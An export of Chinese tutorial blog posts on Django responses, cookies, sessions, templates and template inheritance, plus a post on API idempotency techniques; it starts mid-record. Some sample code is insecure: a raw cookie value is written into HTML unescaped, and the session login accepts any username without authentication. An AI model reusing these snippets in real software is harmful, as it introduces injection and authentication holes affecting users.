response.write('&lt;h1&gt;' + request.COOKIES['h1'] + '&lt;/h1&gt;')\n    response.set_cookie('h1', '你好', 120)\n    # response.set_cookie('h1', '你好', None, datetime(2016, 10, 31))\n    return response\n</code></pre>\n\n<ul><li>delete_cookie(key)：删除指定的key的Cookie，如果key不存在则什么也不发生</li>\n</ul><p>子类HttpResponseRedirect</p>\n\n<ul><li>重定向，服务器端跳转</li>\n\t<li>构造函数的第一个参数用来指定重定向的地址</li>\n</ul><pre class=\"has\">\n<code>在views1.py中\nfrom django.http import HttpResponse,HttpResponseRedirect\ndef index(request):\n    return HttpResponseRedirect('js/')\ndef index2(request,id):\n    return HttpResponse(id)\n\n在应用的urls.py中增加一个url对象\nurl(r'^([0-9]+)/$', views1.index2, name='index2'),\n</code></pre>\n\n<ul><li>请求地址栏如图：</li>\n</ul><p><img alt=\"\" class=\"has\" height=\"31\" src=\"https://img-blog.csdnimg.cn/20190913154615759.png\" width=\"226\"></p>\n\n<p> </p>\n\n<ul><li>请求结果的地址栏如图：</li>\n</ul><p><img alt=\"\" class=\"has\" height=\"27\" src=\"https://img-blog.csdnimg.cn/20190913154654853.png\" width=\"217\"></p>\n\n<p> </p>\n\n<ul><li>推荐使用反向解析</li>\n</ul><pre class=\"has\">\n<code>from django.core.urlresolvers import reverse\n\ndef index(request):\n    return HttpResponseRedirect(reverse('booktest:index2', args=(1,)))\n</code></pre>\n\n<p>子类JsonResponse</p>\n\n<ul><li>返回json数据，一般用于异步请求</li>\n\t<li><em>_init</em> _(data)</li>\n\t<li>帮助用户创建JSON编码的响应</li>\n\t<li>参数data是字典对象</li>\n\t<li>JsonResponse的默认Content-Type为application/json</li>\n</ul><pre class=\"has\">\n<code>from django.http import JsonResponse\n\ndef index2(requeset):\n    return JsonResponse({'list': 'abc'})\n</code></pre>\n\n<h1 id=\"简写函数\">简写函数</h1>\n\n<p>render</p>\n\n<ul><li>render(request, template_name[, context])</li>\n\t<li>结合一个给定的模板和一个给定的上下文字典，并返回一个渲染后的HttpResponse对象</li>\n\t<li>request：该request用于生成response</li>\n\t<li>template_name：要使用的模板的完整名称</li>\n\t<li>context：添加到模板上下文的一个字典，视图将在渲染模板之前调用它</li>\n</ul><pre class=\"has\">\n<code>from django.shortcuts import render\n\ndef index(request):\n    return render(request, 'booktest/index.html', {'h1': 'hello'})\n</code></pre>\n\n<p>重定向</p>\n\n<ul><li>redirect(to)</li>\n\t<li>为传递进来的参数返回HttpResponseRedirect</li>\n\t<li>to推荐使用反向解析</li>\n</ul><pre class=\"has\">\n<code>from django.shortcuts import redirect\nfrom django.core.urlresolvers import reverse\n\ndef index(request):\n    return redirect(reverse('booktest:index2'))\n</code></pre>\n\n<p>得到对象或返回404</p>\n\n<ul><li>get_object_or_404(klass, <em>args, *</em>kwargs)</li>\n\t<li>通过模型管理器或查询集调用get()方法，如果没找到对象，不引发模型的DoesNotExist异常，而是引发Http404异常</li>\n\t<li>klass：获取对象的模型类、Manager对象或QuerySet对象</li>\n\t<li>**kwargs：查询的参数，格式应该可以被get()和filter()接受</li>\n\t<li>如果找到多个对象将引发MultipleObjectsReturned异常</li>\n</ul><pre class=\"has\">\n<code>from django.shortcuts import *\n\ndef detail(request, id):\n    try:\n        book = get_object_or_404(BookInfo, pk=id)\n    except BookInfo.MultipleObjectsReturned:\n        book = None\n    return render(request, 'booktest/detail.html', {'book': book})\n\n将settings.py中的DEBUG改为False\n将请求地址输入2和100查看效果\n</code></pre>\n\n<p>得到列表或返回404</p>\n\n<ul><li>get_list_or_404(klass, <em>args, *</em>kwargs)</li>\n\t<li>klass：获取列表的一个Model、Manager或QuerySet实例</li>\n\t<li>**kwargs：查寻的参数，格式应该可以被get()和filter()接受</li>\n</ul><pre class=\"has\">\n<code>from django.shortcuts import *\n\ndef index(request):\n    # list = get_list_or_404(BookInfo, pk__lt=1)\n    list = get_list_or_404(BookInfo, pk__lt=6)\n    return render(request, 'booktest/index.html', {'list': list})\n\n将settings.py中的DEBUG改为False</code></pre>\n                                    </div>", "log_PostTime": 1584891148, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Django 状态保持3.5", "log_Intro": "Django 状态保持3.5", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1 id=\"状态保持\">状态保持</h1>\n\n<ul><li>http协议是无状态的：每次请求都是一次新的请求，不会记得之前通信的状态</li>\n\t<li>客户端与服务器端的一次通信，就是一次会话</li>\n\t<li>实现状态保持的方式：在客户端或服务器端存储与会话有关的数据</li>\n\t<li>存储方式包括cookie、session，会话一般指session对象</li>\n\t<li>使用cookie，所有数据存储在客户端，注意不要存储敏感信息</li>\n\t<li>推荐使用sesison方式，所有数据存储在服务器端，在客户端cookie中存储session_id</li>\n\t<li>状态保持的目的是在一段时间内跟踪请求者的状态，可以实现跨页面访问当前请求者的数据</li>\n\t<li>注意：不同的请求者之间不会共享这个数据，与请求者一一对应</li>\n</ul><p>启用session</p>\n\n<ul><li>使用django-admin startproject创建的项目默认启用</li>\n\t<li>在settings.py文件中</li>\n</ul><pre class=\"has\">\n<code>项INSTALLED_APPS列表中添加：\n'django.contrib.sessions',\n\n项MIDDLEWARE_CLASSES列表中添加：\n'django.contrib.sessions.middleware.SessionMiddleware',\n</code></pre>\n\n<ul><li>禁用会话：删除上面指定的两个值，禁用会话将节省一些性能消耗</li>\n</ul><p>使用session</p>\n\n<ul><li>启用会话后，每个HttpRequest对象将具有一个session属性，它是一个类字典对象</li>\n\t<li>get(key, default=None)：根据键获取会话的值</li>\n\t<li>clear()：清除所有会话</li>\n\t<li>flush()：删除当前的会话数据并删除会话的Cookie</li>\n\t<li>del request.session['member_id']：删除会话</li>\n</ul><p>用户登录示例</p>\n\n<ul><li>操作效果如下图：</li>\n</ul><p><img alt=\"\" class=\"has\" height=\"233\" src=\"https://img-blog.csdnimg.cn/20190914155411459.gif\" width=\"364\"></p>\n\n<p> </p>\n\n<ul><li>在views.py文件中创建视图</li>\n</ul><pre class=\"has\">\n<code>from django.shortcuts import render, redirect\nfrom django.core.urlresolvers import reverse\n\ndef index(request):\n    uname = request.session.get('uname')\n    return render(request, 'booktest/index.html', {'uname': uname})\n\ndef login(request):\n    return render(request, 'booktest/login.html')\n\ndef login_handle(request):\n    request.session['uname'] = request.POST['uname']\n    return redirect(reverse('main:index'))\n\ndef logout(request):\n    # request.session['uname'] = None\n    # del request.session['uname']\n    # request.session.clear()\n    request.session.flush()\n    return redirect(reverse('main:index'))\n</code></pre>\n\n<ul><li>配置url</li>\n</ul><pre class=\"has\">\n<code>主url：\nfrom django.conf.urls import include, url\nurlpatterns = [\n    url(r'^', include('booktest.urls', namespace='main'))\n]\n\n应用url：\nfrom django.conf.urls import url\nfrom . import views\nurlpatterns = [\n    url(r'^$', views.index, name='index'),\n    url(r'login/$', views.login, name='login'),\n    url(r'login_handle/$', views.login_handle, name='login_handle'),\n    url(r'logout/$', views.logout, name='logout')\n]\n</code></pre>\n\n<ul><li>创建模板index.html</li>\n</ul><pre class=\"has\">\n<code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;首页&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n你好：{{uname}}\n&lt;hr/&gt;\n&lt;a href=\"{%url 'main:login'%}\"&gt;登录&lt;/a&gt;\n&lt;hr/&gt;\n&lt;a href=\"{%url 'main:logout'%}\"&gt;退出&lt;/a&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<ul><li>创建模板login.html</li>\n</ul><pre class=\"has\">\n<code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;登录&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;form method=\"post\" action=\"/login_handle/\"&gt;\n    &lt;input type=\"text\" name=\"uname\"/&gt;\n    &lt;input type=\"submit\" value=\"登录\"/&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>会话过期时间</p>\n\n<ul><li>set_expiry(value)：设置会话的超时时间</li>\n\t<li>如果没有指定，则两个星期后过期</li>\n\t<li>如果value是一个整数，会话将在values秒没有活动后过期</li>\n\t<li>若果value是一个imedelta对象，会话将在当前时间加上这个指定的日期/时间过期</li>\n\t<li>如果value为0，那么用户会话的Cookie将在用户的浏览器关闭时过期</li>\n\t<li>如果value为None，那么会话永不过期</li>\n\t<li>修改视图中login_handle函数，查看效果</li>\n</ul><pre class=\"has\">\n<code>def login_handle(request):\n    request.session['uname'] = request.POST['uname']\n    # request.session.set_expiry(10)\n    # request.session.set_expiry(timedelta(days=5))\n    # request.session.set_expiry(0)\n    # request.session.set_expiry(None)\n    return redirect(reverse('main:index'))\n</code></pre>\n\n<p>存储session</p>\n\n<ul><li>使用存储会话的方式，可以使用settings.py的SESSION_ENGINE项指定</li>\n\t<li>基于数据库的会话：这是django默认的会话存储方式，需要添加django.contrib.sessions到的INSTALLED_APPS设置中，运行manage.py migrate在数据库中安装会话表，可显示指定为</li>\n</ul><pre class=\"has\">\n<code>SESSION_ENGINE='django.contrib.sessions.backends.db'\n</code></pre>\n\n<ul><li>基于缓存的会话：只存在本地内在中，如果丢失则不能找回，比数据库的方式读写更快</li>\n</ul><pre class=\"has\">\n<code>SESSION_ENGINE='django.contrib.sessions.backends.cache'\n</code></pre>\n\n<ul><li>可以将缓存和数据库同时使用：优先从本地缓存中获取，如果没有则从数据库中获取</li>\n</ul><pre class=\"has\">\n<code>SESSION_ENGINE='django.contrib.sessions.backends.cached_db'\n</code></pre>\n\n<p>使用Redis缓存session</p>\n\n<ul><li>会话还支持文件、纯cookie、Memcached、Redis等方式存储，下面演示使用redis存储</li>\n\t<li>安装包</li>\n</ul><pre class=\"has\">\n<code>pip install django-redis-sessions\n</code></pre>\n\n<ul><li>修改settings中的配置，增加如下项</li>\n</ul><pre class=\"has\">\n<code>SESSION_ENGINE = 'redis_sessions.session'\nSESSION_REDIS_HOST = 'localhost'\nSESSION_REDIS_PORT = 6379\nSESSION_REDIS_DB = 0\nSESSION_REDIS_PASSWORD = ''\nSESSION_REDIS_PREFIX = 'session'\n</code></pre>\n\n<ul><li>管理redis的命令</li>\n</ul><pre class=\"has\">\n<code>启动：sudo redis-server /etc/redis/redis.conf\n停止：sudo redis-server stop\n重启：sudo redis-server restart\nredis-cli：使用客户端连接服务器\nkeys *：查看所有的键\nget name：获取指定键的值\ndel name：删除指定名称的键</code></pre>\n                                    </div>", "log_PostTime": 1584891150, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Django 模板4.1", "log_Intro": "Django 模板4.1", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1 id=\"模板介绍\">模板介绍</h1>\n\n<ul><li>作为Web框架，Django提供了模板，可以很便利的动态生成HTML</li>\n\t<li>模版系统致力于表达外观，而不是程序逻辑</li>\n\t<li>模板的设计实现了业务逻辑(view)与显示内容（template）的分离，一个视图可以使用任意一个模板，一个模板可以供多个视图使用</li>\n\t<li>模板包含\n\t<ul><li>HTML的静态部分</li>\n\t\t<li>动态插入内容部分</li>\n\t</ul></li>\n\t<li>Django模板语言，简写DTL，定义在django.template包中</li>\n\t<li>由startproject命令生成的settings.py定义关于模板的值：\n\t<ul><li>DIRS定义了一个目录列表，模板引擎按列表顺序搜索这些目录以查找模板源文件</li>\n\t\t<li>APP_DIRS告诉模板引擎是否应该在每个已安装的应用中查找模板</li>\n\t</ul></li>\n\t<li>常用方式：在项目的根目录下创建templates目录，设置DIRS值</li>\n</ul><pre class=\"has\">\n<code>DIRS=[os.path.join(BASE_DIR,\"templates\")]\n</code></pre>\n\n<p>模板处理</p>\n\n<ul><li>Django处理模板分为两个阶段</li>\n\t<li>Step1 加载：根据给定的标识找到模板然后预处理，通常会将它编译好放在内存中</li>\n</ul><pre class=\"has\">\n<code>loader.get_template(template_name)，返回一个Template对象\n</code></pre>\n\n<ul><li>Step2 渲染：使用Context数据对模板插值并返回生成的字符串</li>\n</ul><pre class=\"has\">\n<code>Template对象的render(RequestContext)方法，使用context渲染模板\n</code></pre>\n\n<ul><li>加载渲染完整代码：</li>\n</ul><pre class=\"has\">\n<code>from django.template import loader, RequestContext\nfrom django.http import HttpResponse\n\ndef index(request):\n    tem = loader.get_template('temtest/index.html')\n    context = RequestContext(request, {})\n    return HttpResponse(tem.render(context))\n</code></pre>\n\n<p>快捷函数</p>\n\n<ul><li>为了减少加载模板、渲染模板的重复代码，django提供了快捷函数</li>\n\t<li>render_to_string(\"\")</li>\n\t<li>render(request,'模板',context)</li>\n</ul><pre class=\"has\">\n<code>from django.shortcuts import render\n\ndef index(request):\n    return render(request, 'temtest/index.html')</code></pre>\n\n<h1 id=\"定义模板\">定义模板</h1>\n\n<ul><li>模板语言包括\n\t<ul><li>变量</li>\n\t\t<li>标签 { % 代码块 % }</li>\n\t\t<li>过滤器</li>\n\t\t<li>注释{# 代码或html #}</li>\n\t</ul></li>\n</ul><p>变量</p>\n\n<ul><li>语法：</li>\n</ul><pre class=\"has\">\n<code>{{ variable }}\n</code></pre>\n\n<ul><li>当模版引擎遇到一个变量，将计算这个变量，然后将结果输出</li>\n\t<li>变量名必须由字母、数字、下划线（不能以下划线开头）和点组成</li>\n\t<li>当模版引擎遇到点(\".\")，会按照下列顺序查询：\n\t<ol><li>字典查询，例如：foo[\"bar\"]</li>\n\t\t<li>属性或方法查询，例如：foo.bar</li>\n\t\t<li>数字索引查询，例如：foo[bar]</li>\n\t</ol></li>\n\t<li>如果变量不存在， 模版系统将插入'' (空字符串)</li>\n\t<li>在模板中调用方法时不能传递参数</li>\n</ul><p>在模板中调用对象的方法</p>\n\n<ul><li>在models.py中定义类HeroInfo</li>\n</ul><pre class=\"has\">\n<code>from django.db import models\n\nclass HeroInfo(models.Model):\n    ...\n    def showName(self):\n        return self.hname\n</code></pre>\n\n<ul><li>在views.py中传递HeroInfo对象</li>\n</ul><pre class=\"has\">\n<code>from django.shortcuts import render\nfrom models import *\n\ndef index(request):\n    hero = HeroInfo(hname='abc')\n    context = {'hero': hero}\n    return render(request, 'temtest/detail.html', context)\n</code></pre>\n\n<ul><li>在模板detail.html中调用</li>\n</ul><pre class=\"has\">\n<code>{{hero.showName}}\n</code></pre>\n\n<p>标签</p>\n\n<ul><li>语法：{ % tag % }</li>\n\t<li>作用\n\t<ul><li>在输出中创建文本</li>\n\t\t<li>控制循环或逻辑</li>\n\t\t<li>加载外部信息到模板中供以后的变量使用</li>\n\t</ul></li>\n\t<li>for标签</li>\n</ul><pre class=\"has\">\n<code>{ %for ... in ...%}\n循环逻辑\n{{forloop.counter}}表示当前是第几次循环\n{ %empty%}\n给出的列表为或列表不存在时，执行此处\n{ %endfor%}\n</code></pre>\n\n<ul><li>if标签</li>\n</ul><pre class=\"has\">\n<code>{ %if ...%}\n逻辑1\n{ %elif ...%}\n逻辑2\n{ %else%}\n逻辑3\n{ %endif%}\n</code></pre>\n\n<ul><li>comment标签</li>\n</ul><pre class=\"has\">\n<code>{ % comment % }\n多行注释\n{ % endcomment % }\n</code></pre>\n\n<ul><li>include：加载模板并以标签内的参数渲染</li>\n</ul><pre class=\"has\">\n<code>{ %include \"foo/bar.html\" % }\n</code></pre>\n\n<ul><li>url：反向解析</li>\n</ul><pre class=\"has\">\n<code>{ % url 'name' p1 p2 %}\n</code></pre>\n\n<ul><li>csrf_token：这个标签用于跨站请求伪造保护</li>\n</ul><pre class=\"has\">\n<code>{ % csrf_token %}\n</code></pre>\n\n<ul><li>布尔标签：and、or，and比or的优先级高</li>\n\t<li>block、extends：详见“模板继承”</li>\n\t<li>autoescape：详见“HTML转义”</li>\n</ul><p>过滤器</p>\n\n<ul><li>语法：{ { 变量|过滤器 }}，例如{ { name|lower }}，表示将变量name的值变为小写输出</li>\n\t<li>使用管道符号 (|)来应用过滤器</li>\n\t<li>通过使用过滤器来改变变量的计算结果</li>\n\t<li>可以在if标签中使用过滤器结合运算符</li>\n</ul><pre class=\"has\">\n<code>if list1|length &gt; 1\n</code></pre>\n\n<ul><li>过滤器能够被“串联”，构成过滤器链</li>\n</ul><pre class=\"has\">\n<code>name|lower|upper\n</code></pre>\n\n<ul><li>过滤器可以传递参数，参数使用引号包起来</li>\n</ul><pre class=\"has\">\n<code>list|join:\", \"\n</code></pre>\n\n<ul><li>default：如果一个变量没有被提供，或者值为false或空，则使用默认值，否则使用变量的值</li>\n</ul><pre class=\"has\">\n<code>value|default:\"什么也没有\"\n</code></pre>\n\n<ul><li>date：根据给定格式对一个date变量格式化</li>\n</ul><pre class=\"has\">\n<code>value|date:'Y-m-d'\n</code></pre>\n\n<ul><li>escape：详见“HTML转义”</li>\n\t<li>点击<a href=\"#%20https://docs.djangoproject.com/en/1.8/ref/settings/%23databases\" rel=\"nofollow\">查看</a>详细的过滤器</li>\n</ul><p>注释</p>\n\n<ul><li>单行注释</li>\n</ul><pre class=\"has\">\n<code>{#...#}\n</code></pre>\n\n<ul><li>注释可以包含任何模版代码，有效的或者无效的都可以</li>\n</ul><pre class=\"has\">\n<code>{# { % if foo % }bar{ % else % } #}\n</code></pre>\n\n<ul><li>使用comment标签注释模版中的多行内容</li>\n</ul><p>示例</p>\n\n<ul><li>查询所有英雄信息显示出来，要求奇数行显示为红色，偶数行显示为蓝色</li>\n</ul><p> </p>\n                                    </div>", "log_PostTime": 1584891151, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "高并发下接口幂等性技术方案", "log_Intro": "高并发下接口幂等性技术方案", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h3>一、背景 </h3>\n\n<p><br>\n      我们实际系统中有很多操作，是不管做多少次，都应该产生一样的效果或返回一样的结果。 例如1. 前端重复提交选中的数据，应该后台只产生对应这个数据的一个反应结果；2. 我们发起一笔付款请求，应该只扣用户账户一次钱，当遇到网络重发或系统bug重发，也应该只扣一次钱；3. 发送消息，也应该只发一次，同样的短信发给用户，用户会哭的；4. 创建业务订单，一次业务请求只能创建一个，创建多个就会出大问题等等很多重要的情况都需要幂等的特性来支持。 </p>\n\n<h3><br>\n二、幂等性概念 </h3>\n\n<p><br>\n      幂等（idempotent、idempotence）是一个数学与计算机学概念，常见于抽象代数中。 在编程中.一个幂等操作的特点是其任意多次执行所产生的影响均与一次执行的影响相同。幂等函数，或幂等方法，是指可以使用相同参数重复执行，并能获得相同结果的函数。这些函数不会影响系统状态，也不用担心重复执行会对系统造成改变。例如，“getUsername()和setTrue()”函数就是一个幂等函数. 更复杂的操作幂等保证是利用唯一交易号(流水号)实现. 我的理解：幂等就是一个操作，不论执行多少次，产生的效果和返回的结果都是一样的 </p>\n\n<h3>三、技术方案 </h3>\n\n<p><br><strong>1、查询操作：</strong>查询一次和查询多次，在数据不变的情况下，查询结果是一样的。select是天然的幂等操作；<br><strong>2、删除操作：</strong>删除操作也是幂等的，删除一次和多次删除都是把数据删除。(注意可能返回结果不一样，删除的数据不存在，返回0，删除的数据多条，返回结果多个) ；<br><strong>3、唯一索引，防止新增脏数据。</strong>比如：支付宝的资金账户，支付宝也有用户账户，每个用户只能有一个资金账户，怎么防止给用户创建资金账户多个，那么给资金账户表中的用户ID加唯一索引，所以一个用户新增成功一个资金账户记录。要点：唯一索引或唯一组合索引来防止新增数据存在脏数据（当表存在唯一索引，并发时新增报错时，再查询一次就可以了，数据应该已经存在了，返回结果即可）；<br><strong>4、token机制，防止页面重复提交。</strong>业务要求： 页面的数据只能被点击提交一次；发生原因： 由于重复点击或者网络重发，或者nginx重发等情况会导致数据被重复提交；解决办法： 集群环境采用token加redis(redis单线程的，处理需要排队)；单JVM环境：采用token加redis或token加jvm内存。处理流程：1. 数据提交前要向服务的申请token，token放到redis或jvm内存，token有效时间；2. 提交后后台校验token，同时删除token，生成新的token返回。token特点：要申请，一次有效性，可以限流。注意：redis要用删除操作来判断token，删除成功代表token校验通过，如果用select+delete来校验token，存在并发问题，不建议使用；<br><strong>5、悲观锁</strong>——获取数据的时候加锁获取。<strong>select * from table_xxx where id='xxx' for update</strong>; 注意：id字段一定是主键或者唯一索引，不然是锁表，会死人的悲观锁使用时一般伴随事务一起使用，数据锁定时间可能会很长，根据实际情况选用； <br><strong>6、乐观锁</strong>——乐观锁只是在更新数据那一刻锁表，其他时间不锁表，所以相对于悲观锁，效率更高。乐观锁的实现方式多种多样可以通过version或者其他状态条件：1. 通过版本号实现update table_<strong>xxx set name=#name#,version=version+1 where version=#version#</strong>如下图(来自网上)；2. 通过条件限制 <strong>update table_xxx set avai_amount=avai_amount-#subAmount# where avai_amount-#subAmount# &gt;= 0</strong>要求：quality-#subQuality# &gt;= ，这个情景适合不用版本号，只更新是做数据安全校验，适合库存模型，扣份额和回滚份额，性能更高；</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20190921134421655.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"><br>\n      <strong>注意：</strong>乐观锁的更新操作，<strong>最好用主键或者唯一索引来更新,这样是行锁，否则更新时会锁表</strong>，上面两个sql改成下面的两个更好 </p>\n\n<pre class=\"has\">\n<code class=\"language-sql\">update table_xxx set name=#name#,version=version+1 where id=#id# and version=#version#；\nupdate table_xxx set avai_amount=avai_amount-#subAmount# where id=#id# and avai_amount-#subAmount# &gt;= 0；</code></pre>\n\n<p><br>\n  <strong>  7、分布式锁</strong>——还是拿插入数据的例子，如果是分布是系统，构建全局唯一索引比较困难，例如唯一性的字段没法确定，这时候可以引入分布式锁，通过第三方的系统(redis或zookeeper)，在业务系统插入数据或者更新数据，获取分布式锁，然后做操作，之后释放锁，这样其实是把多线程并发的锁的思路，引入多多个系统，也就是分布式系统中得解决思路。要点：某个长流程处理过程要求不能并发执行，可以在流程执行之前根据某个标志(用户ID+后缀等)获取分布式锁，其他流程执行时获取锁就会失败，也就是同一时间该流程只能有一个能执行成功，执行完成后，释放分布式锁(分布式锁要第三方系统提供)；</p>\n\n<p>    <strong>8、 select + insert</strong>——并发不高的后台系统，或者一些任务JOB，为了支持幂等，支持重复执行，简单的处理方法是，先查询下一些关键数据，判断是否已经执行过，在进行业务处理，就可以了。注意：核心高并发流程不要用这种方法；</p>\n\n<p>    <strong>9.、状态机幂等</strong>——在设计单据相关的业务，或者是任务相关的业务，肯定会涉及到状态机(状态变更图)，就是业务单据上面有个状态，状态在不同的情况下会发生变更，一般情况下存在有限状态机，这时候，如果状态机已经处于下一个状态，这时候来了一个上一个状态的变更，理论上是不能够变更的，这样的话，保证了有限状态机的幂等。注意：订单等单据类业务，存在很长的状态流转，一定要深刻理解状态机，对业务系统设计能力提高有很大帮助 <br>\n    <strong>10、 对外提供接口的api如何保证幂等</strong>。如银联提供的付款接口：需要接入商户提交付款请求时附带：source来源，seq序列号 <br>\nsource+seq在数据库里面做唯一索引，防止多次付款(并发时，只能处理一个请求) 。重点：对外提供接口为了支持幂等调用，接口有两个字段必须传，一个是来源source，一个是来源方序列号seq，这个两个字段在提供方系统里面做联合唯一索引，这样当第三方调用时，先在本方系统里面查询一下，是否已经处理过，返回相应处理结果；没有处理过，进行相应处理，返回结果。注意，为了幂等友好，一定要先查询一下，是否处理过该笔业务，不查询直接插入业务系统，会报错，但实际已经处理了。 </p>\n\n<h3><br>\n四、总结</h3>\n\n<p><br>\n      幂等与你是不是分布式高并发还有JavaEE都没有关系。关键是你的操作是不是幂等的。一个幂等的操作典型如：把编号为5的记录的A字段设置为0这种操作不管执行多少次都是幂等的。一个非幂等的操作典型如：把编号为5的记录的A字段增加1这种操作显然就不是幂等的。要做到幂等性，从接口设计上来说不设计任何非幂等的操作即可。譬如说需求是：当用户点击赞同时，将答案的赞同数量+1。改为：当用户点击赞同时，确保答案赞同表中存在一条记录，用户、答案。赞同数量由答案赞同表统计出来。总之幂等性应该是合格程序员的一个基因，在设计系统时，是首要考虑的问题，尤其是在像支付宝，银行，互联网金融公司等涉及的都是钱的系统，既要高效，数据也要准确，所以不能出现多扣款，多打款等问题，这样会很难处理，用户体验也不好。<br>\n </p>\n                                    </div>", "log_PostTime": 1584891152, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Django 模板继承4.2", "log_Intro": "Django 模板继承4.2", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h3 id=\"模板继承\">模板继承</h3>\n\n<ul><li>模板继承可以减少页面内容的重复定义，实现页面内容的重用</li>\n\t<li>典型应用：网站的头部、尾部是一样的，这些内容可以定义在父模板中，子模板不需要重复定义</li>\n\t<li>block标签：在父模板中预留区域，在子模板中填充</li>\n\t<li>extends继承：继承，写在模板文件的第一行</li>\n\t<li>定义父模板base.html</li>\n</ul><pre class=\"has\">\n<code>{ %block block_name%}\n这里可以定义默认值\n如果不定义默认值，则表示空字符串\n{ %endblock%}\n</code></pre>\n\n<ul><li>定义子模板index.html</li>\n</ul><pre class=\"has\">\n<code>{ % extends \"base.html\" %}\n</code></pre>\n\n<ul><li>在子模板中使用block填充预留区域</li>\n</ul><pre class=\"has\">\n<code>{ %block block_name%}\n实际填充内容\n{ %endblock%}\n</code></pre>\n\n<p>说明</p>\n\n<ul><li>如果在模版中使用extends标签，它必须是模版中的第一个标签</li>\n\t<li>不能在一个模版中定义多个相同名字的block标签</li>\n\t<li>子模版不必定义全部父模版中的blocks，如果子模版没有定义block，则使用了父模版中的默认值</li>\n\t<li>如果发现在模板中大量的复制内容，那就应该把内容移动到父模板中</li>\n\t<li>使用可以获取父模板中block的内容</li>\n\t<li>为了更好的可读性，可以给endblock标签一个名字</li>\n</ul><pre class=\"has\">\n<code>{ % block block_name %}\n区域内容\n{ % endblock block_name %}\n</code></pre>\n\n<h1 id=\"三层继承结构\">三层继承结构</h1>\n\n<ul><li>三层继承结构使代码得到最大程度的复用，并且使得添加内容更加简单</li>\n\t<li>如下图为常见的电商页面</li>\n</ul><p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20190921152236339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p> </p>\n\n<p>1.创建根级模板</p>\n\n<ul><li>名称为“base.html”</li>\n\t<li>存放整个站点共用的内容</li>\n</ul><pre class=\"has\">\n<code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;{%block title%}{%endblock%} 水果超市&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\ntop--{{logo}}\n&lt;hr/&gt;\n{%block left%}{%endblock%}\n{%block content%}{%endblock%}\n&lt;hr/&gt;\nbottom\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>2.创建分支模版</p>\n\n<ul><li>继承自base.html</li>\n\t<li>名为“base_<em>*</em>.html”</li>\n\t<li>定义特定分支共用的内容</li>\n\t<li>定义base_goods.html</li>\n</ul><pre class=\"has\">\n<code>{%extends 'temtest/base.html'%}\n{%block title%}商品{%endblock%}\n{%block left%}\n&lt;h1&gt;goods left&lt;/h1&gt;\n{%endblock%}\n</code></pre>\n\n<ul><li>定义base_user.html</li>\n</ul><pre class=\"has\">\n<code>{%extends 'temtest/base.html'%}\n{%block title%}用户中心{%endblock%}\n{%block left%}\n&lt;font color='blue'&gt;user left&lt;/font&gt;\n{%endblock%}\n</code></pre>\n\n<ul><li>定义index.html，继承自base.html，不需要写left块</li>\n</ul><pre class=\"has\">\n<code>{%extends 'temtest/base.html'%}\n{%block content%}\n首页内容\n{%endblock content%}\n</code></pre>\n\n<p>3.为具体页面创建模板，继承自分支模板</p>\n\n<ul><li>定义商品列表页goodslist.html</li>\n</ul><pre class=\"has\">\n<code>{%extends 'temtest/base_goods.html'%}\n{%block content%}\n商品正文列表\n{%endblock content%}\n</code></pre>\n\n<ul><li>定义用户密码页userpwd.html</li>\n</ul><pre class=\"has\">\n<code>{%extends 'temtest/base_user.html'%}\n{%block content%}\n用户密码修改\n{%endblock content%}\n</code></pre>\n\n<p>4.视图调用具体页面，并传递模板中需要的数据</p>\n\n<ul><li>首页视图index</li>\n</ul><pre class=\"has\">\n<code>logo='welcome to itcast'\ndef index(request):\n    return render(request, 'temtest/index.html', {'logo': logo})\n</code></pre>\n\n<ul><li>商品列表视图goodslist</li>\n</ul><pre class=\"has\">\n<code>def goodslist(request):\n    return render(request, 'temtest/goodslist.html', {'logo': logo})\n</code></pre>\n\n<ul><li>用户密码视图userpwd</li>\n</ul><pre class=\"has\">\n<code>def userpwd(request):\n    return render(request, 'temtest/userpwd.html', {'logo': logo})\n</code></pre>\n\n<p>5.配置url</p>\n\n<pre class=\"has\">\n<code>from django.conf.urls import url\nfrom . import views\nurlpatterns = [\n    url(r'^$', views.index, name='index'),\n    url(r'^list/$', views.goodslist, name='list'),\n    url(r'^pwd/$', views.userpwd, name='pwd'),\n]</code></pre>\n                                    </div>", "log_PostTime": 1584891154, "log_Meta": ""}
